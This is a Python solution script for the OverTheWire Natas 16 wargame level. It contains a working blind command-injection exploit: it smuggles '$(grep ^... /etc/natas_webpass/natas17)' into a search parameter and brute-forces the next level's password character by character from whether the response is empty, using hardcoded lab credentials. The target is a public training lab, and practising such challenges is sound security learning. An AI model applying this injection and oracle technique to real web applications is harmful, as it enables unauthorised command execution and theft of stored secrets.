import string as str
import requests as req
import re

allChar = str.ascii_letters + str.digits
# a-Z A-Z 0-9

# natas 16 login credentials
username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://natas16.natas.labs.overthewire.org/"
session = req.Session()
flagLen = 32

flagpsswd = [] # list to store the leaking password for natas16
while (True):
    for e in allChar:
        print("Leaking Password")
        response = session.post(url, data = {"needle" : "everything$(grep ^" + "".join(flagpsswd) + e + " /etc/natas_webpass/natas17)" }, auth = (username, password) )
        returnedContent = response.text
        # print(returnedContent)
        finding = re.findall( '<pre>\n(.*)\n</pre>', returnedContent)

        if (not finding):
            flagpsswd.append(e)
            print ("Got ", "".join(flagpsswd))
            break

    if (len(flagpsswd) == flagLen):
        print("Found! ", "".join(flagpsswd))
        break